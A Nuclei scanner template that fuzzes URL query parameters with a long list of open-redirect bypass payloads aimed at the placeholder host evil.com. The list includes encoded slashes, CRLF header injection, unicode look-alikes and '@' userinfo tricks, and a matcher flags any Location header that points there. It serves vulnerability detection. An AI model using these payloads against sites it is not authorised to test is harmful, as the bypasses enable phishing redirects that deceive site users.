id: open-redirect-param-fuzzing

info:
  name: Open Redirect Fuzzing Param
  author: reewardius
  severity: low
  description: A user-controlled input redirects users to an external website.
  tags: fuzzing-redirect,fuzzing-req
  
http:
  - method: GET
    path:
      - "{{BaseURL}}"
      
    payloads:
      redirect:
        - "//evil.com"
        - "//evil.com/?:"
        - "@evil.com"
        - "evil.com"
        - "http://evil.com"
        - "http://evil.com/%2F"
        - "https://evil.com"
        - "https://evil.com/%2F"
        - "https://evil.com////"
        - "https://{{Host}}.evil.com"
        - "{{Host}}@evil.com"
        - '$2f%2fevil.com%2f%2f'
        - '$2f%2fevil.com'
        - '%00/evil.com/'
        - '%01https://evil.com'
        - '%09/evil.com/'
        - '%0a/evil.com/'
        - '%5Cevil.com'
        - '%5c%5cevil.com//'
        - '-evil.com'
        - '.evil.com'
        - '/%00/evil.com/'
        - '/%01https://evil.com'
        - '/%09/evil.com'
        - '/%09/evil.com/'
        - '/%09/{{Host}}@evil.com'
        - '/%0a/evil.com/'
        - '/%0d%0ahttp://evil.com/'
        - '/%0d/evil.com/'
        - '/%2f$2fevil.com'
        - '/%2f%2fevil.com'
        - '/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/'
        - '/%2fevil.com%2f%2f'
        - '/%2fevil.com'
        - '/%2fevil.com//'
        - '/%5C%5Cevil.com/%252e%252e%252f'
        - '/%5cevil.com'
        - '/%5cevil.com/%2f%2e%2e'
        - '/%5c{{Host}}@evil.com'
        - '/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d'
        - '/&%0d%0a1Location:https://evil.com'
        - '/../evil.com'
        - '/.//evil.com'
        - '/.evil.com'
        - '//%09/evil.com'
        - '//%09/{{Host}}@evil.com'
        - '//%2f%2fevil.com'
        - '//%5cevil.com'
        - '//%5c{{Host}}@evil.com'
        - '///%09/evil.com'
        - '///%09/{{Host}}@evil.com'
        - '///%5cevil.com'
        - '///%5c{{Host}}@evil.com'
        - '////%09/evil.com'
        - '////%09/{{Host}}@evil.com'
        - '////%5cevil.com'
        - '////%5c{{Host}}@evil.com'
        - '/////evil.com'
        - '/////evil.com/'
        - '/////evil%E3%80%82com'
        - '////\;@evil.com'
        - '////evil.com'
        - '////evil.com/%2e%2e%2f'
        - '////evil.com/%2e%2e'
        - '////evil.com/%2f%2e%2e'
        - '////evil.com/%2f..'
        - '////evil.com/'
        - '////evil.com//'
        - '////evil%E3%80%82com'
        - '////{{Host}}@evil.com/%2e%2e%2f'
        - '////{{Host}}@evil.com/%2e%2e'
        - '////{{Host}}@evil.com/%2f%2e%2e'
        - '////{{Host}}@evil.com/%2f..'
        - '////{{Host}}@evil.com/'
        - '////{{Host}}@evil.com//'
        - '///;@evil.com'
        - '///\;@evil.com'
        - '///evil.com'
        - '///evil.com/%2e%2e%2f'
        - '///evil.com/%2e%2e'
        - '///evil.com/%2f%2e%2e'
        - '///evil.com/%2f..'
        - '///evil.com/'
        - '///evil.com//'
        - '///evil.com@//'
        - '///evil%E3%80%82com'
        - '///{{Host}}@evil.com/%2e%2e%2f'
        - '///{{Host}}@evil.com/%2e%2e'
        - '///{{Host}}@evil.com/%2f%2e%2e'
        - '///{{Host}}@evil.com/%2f..'
        - '///{{Host}}@evil.com/'
        - '///{{Host}}@evil.com//'
        - '///{{RootURL}}.evil.com/%2f%2e%2e'
        - '///{{RootURL}}evil.com/%2f%2e%2e'
        - '//3H6k7lIAiqjfNeN@{{Host}}+@evil.com/'
        - '//3H6k7lIAiqjfNeN@{{Host}}@evil.com/'
        - '//;@evil.com'
        - '//XY>.7d8T\205pZM@{{Host}}+@evil.com/'
        - '//XY>.7d8T\205pZM@{{Host}}@evil.com/'
        - '//\/evil.com/'
        - '//\@evil.com'
        - '//\evil.com'
        - '//\tevil.com/'
        - '//evil.com'
        - '//evil.com/%2E%2E'
        - '//evil.com/%2F.. '
        - '//evil.com/%2F..'
        - '//evil.com/%2e%2e%2f'
        - '//evil.com/%2e%2e'
        - '//evil.com/%2f%2e%2e'
        - '//evil.com/%2f..'
        - '//evil.com/'
        - '//evil.com//%2F%2E%2E'
        - '//evil.com//'
        - '//evil.com/{{Host}}'
        - '//evil.com:80#@{{Host}}/'
        - '//evil.com:80?@{{Host}}/'
        - '//evil.com@//'
        - '//evil.com\@{{Host}}'
        - '//evil.com\tevil.com/'
        - '//evil.com\t{{Host}}/'
        - '//evil%00.com'
        - '//evil%E3%80%82com'
        - '//https:///evil.com/%2e%2e'
        - '//https://evil.com/%2e%2e%2f'
        - '//https://evil.com//'
        - '//https://evil.com@//'
        - '//https://{{Host}}@evil.com/%2e%2e%2f'
        - '//https://{{Host}}@evil.com//'
        - '//{{Host}}+&@evil.com#+@{{Host}}/'
        - '//{{Host}}.evil.com/'
        - '//{{Host}}@evil.com/%2e%2e%2f'
        - '//{{Host}}@evil.com/%2f%2e%2e'
        - '//{{Host}}@evil.com/%2f..'
        - '//{{Host}}@evil.com/'
        - '//{{Host}}@evil.com//'
        - '//{{Host}}@https:///evil.com/%2e%2e'
        - '/<>//evil.com'
        - '/?@evil.com'
        - '/\/\/evil.com/'
        - '/\/evil.com'
        - '/\/evil.com/'
        - '/\evil.com'
        - '/\evil%252ecom'
        - '/\{{Host}}:80%40evil.com'
        - '/evil.com'
        - '/evil.com/%2F.. '
        - '/evil.com/%2F..'
        - '/evil.com/%2e%2e'
        - '/evil.com/%2f%2e%2e'
        - '/evil.com/'
        - '/evil.com/..;/css'
        - '/http://evil.com'
        - '/http:/evil.com'
        - '/https:/%5cevil.com/'
        - '/https://%09/evil.com'
        - '/https://%5cevil.com'
        - '/https://%5c{{Host}}@evil.com'
        - '/https:///evil.com/%2f%2e%2e'
        - '/https:///{{Host}}@evil.com/%2f%2e%2e'
        - '/https://evil.com'
        - '/https://evil.com/%2e%2e'
        - '/https://evil.com/%2f%2e%2e'
        - '/https://evil.com/%2f..'
        - '/https://evil.com/'
        - '/https://evil.com//'
        - '/https://{{Host}}@evil.com/%2e%2e'
        - '/https://{{Host}}@evil.com/%2f%2e%2e'
        - '/https://{{Host}}@evil.com/%2f..'
        - '/https://{{Host}}@evil.com/%2f.//{{Host}}@evil.com/%2f..'
        - '/https://{{Host}}@evil.com/'
        - '/https:evil.com'
        - '/〱evil.com'
        - '/〵evil.com'
        - '/ゝevil.com'
        - '/ーevil.com'
        - '/ｰevil.com'
        - '0%3Bhttp%3A%2f%2fevil.com%22HTTP-EQUIV%3D%22refresh%22'
        - '0;http://evil.com"HTTP-EQUIV="refresh"'	
        - '0x7f000001'
        - '2130706433'
        - '<>//evil.com'
        - '@evil.com'
        - '@https://evil.com'
        - '@https://www.evil.com'
        - '@{{Host}}.evil.com/'
        - '\/\/evil.com/'
        - 'evil.com%00'
        - 'evil.com%23@{{Host}}'
        - 'evil.com%253f%3b/1.bp.blogspot.com/'
        - 'evil.com'
        - 'evil.com/'
        - 'evil.com/.jpg'
        - 'evil.com//'
        - 'evil.com/{{Host}}'
        - 'evil.com;@'
        - 'evil%252ecom'
        - 'evil%E3%80%82com'
        - 'http:%0a%0devil.com'
        - 'http://.evil.com'
        - 'http://3H6k7lIAiqjfNeN@{{Host}}+@evil.com/'
        - 'http://3H6k7lIAiqjfNeN@{{Host}}@evil.com/'
        - 'http://;@evil.com'
        - 'http://evil.com%23.{{Host}}/'
        - 'http://evil.com%2f%2f.{{Host}}/'
        - 'http://evil.com%3F.{{Host}}/'
        - 'http://evil.com%5c%5c.{{Host}/'
        - 'http://evil.com'
        - 'http://evil.com:80#@{{Host}}/'
        - 'http://evil.com:80?@{{Host}}/'
        - 'http://evil.com\t{{Host}}/'
        - 'http://www.evil.com\.{{Host}}'
        - 'http://{{Host}}%2eevil.com/'
        - 'http://{{Host}}+&@evil.com#+@{{Host}}/'
        - 'http://{{Host}}:80%40evil.com/'
        - 'http://{{Host}}@evil.com/'
        - 'http:/\/\evil.com'
        - 'http:/evil.com'
        - 'http:evil.com'
        - 'http:http:evil.com'
        - 'https%3a%2f%2fevil.com%2f'
        - 'https:%0a%0devil.com'
        - 'https:.\\\.evil.com'
        - 'https:.\\\{{Host}}.evil.com'
        - 'https:.\\\{{Host}}@evil.com'
        - 'https:/%5cevil.com/'
        - 'https://%09/evil.com'
        - 'https://%09/{{Host}}@evil.com'
        - 'https://%0a%0devil.com'
        - 'https://%23.evil.com/'
        - 'https://%2f%2f.evil.com/'
        - 'https://%3F.evil.com/'
        - 'https://%5c%5c.evil.com/'
        - 'https://%5cevil.com'
        - 'https://%5cevil.com@'
        - 'https://%5c{{Host}}@evil.com'
        - 'https://.evil.com'
        - 'https://////evil.com'
        - 'https:///evil.com'
        - 'https:///evil.com/%2e%2e'
        - 'https:///evil.com/%2f%2e%2e'
        - 'https:///evil.com@evil.com/%2e%2e'
        - 'https:///evil.com@evil.com/%2f%2e%2e'
        - 'https:///{{Host}}@evil.com/%2e%2e'
        - 'https:///{{Host}}@evil.com/%2f%2e%2e'
        - 'https://0x7f000001'
        - 'https://2130706433'
        - 'https://:80#@evil.com/'
        - 'https://:80?@evil.com/'
        - 'https://:@\@evil.com'
        - 'https://:@evil.com\@evil.com'
        - 'https://:@evil.com\@{{Host}}'
        - 'https://;@evil.com'
        - 'https://@evil.com\\@{{Host}}'
        - 'https://\tevil.com/'
        - 'https://evil.com#{{Host}}'
        - 'https://evil.com%09{{Host}}'
        - 'https://evil.com%0d{{Host}}'
        - 'https://evil.com%5c@google.com/'
        - 'https://evil.com%EF%BC%BC@google.com/'
        - 'https://evil.com'
        - 'https://evil.com/%2e%2e%2f'
        - 'https://evil.com/%2f%2e%2e'
        - 'https://evil.com/%2f..'
        - 'https://evil.com/'
        - 'https://evil.com//'
        - 'https://evil.com/evil.com'
        - 'https://evil.com/https://evil.com/'
        - 'https://evil.com/{{Host}}'
        - 'https://evil.com?;/{{Host}}'
        - 'https://evil.com?{{Host}}'
        - 'https://evil.com\{{Host}}'
        - 'https://google%E3%80%82com'
        - 'https://www.%E2%80%AEevil.com'
        - 'https://www.\.evil.com'
        - 'https://www.google.com/avatar/../evil.com'
        - 'https://{{Host}}.evil.com'
        - 'https://{{Host}}/%2Fevil%252Ecom'
        - 'https://{{Host}}///evil.com'
        - 'https://{{Host}}/https://evil.com/'
        - 'https://{{Host}};@evil.com'
        - 'https://{{Host}}@evil.com'
        - 'https://{{Host}}@evil.com/%2e%2e%2f'
        - 'https://{{Host}}@evil.com/%2f%2e%2e'
        - 'https://{{Host}}@evil.com/%2f..'
        - 'https://{{Host}}@evil.com/'
        - 'https://{{Host}}@evil.com//'
        - 'https:/\/\evil.com'
        - 'https:/\evil.com'
        - 'https:/evil.com'
        - 'https:evil.com'
        - '{{Host}}.evil.com'
        - '{{Host}}.evil.com/'
        - '{{Host}};@evil.com'
        - '{{Host}}@%E2%80%AE@evil.com'
        - '〱evil.com'
        - '〵evil.com'
        - 'ゝevil.com'
        - 'ーevil.com'
        - 'evil.com://{{Host}}'
        - 'evil.com://{{Hostname}}'
        
    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - "{{redirect}}"
          
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]*)evil\.com\/?(\/|[^.].*)?$'

      - type: status
        status:
          - 301
          - 302
          - 303
          - 304
          - 306
          - 307
          - 308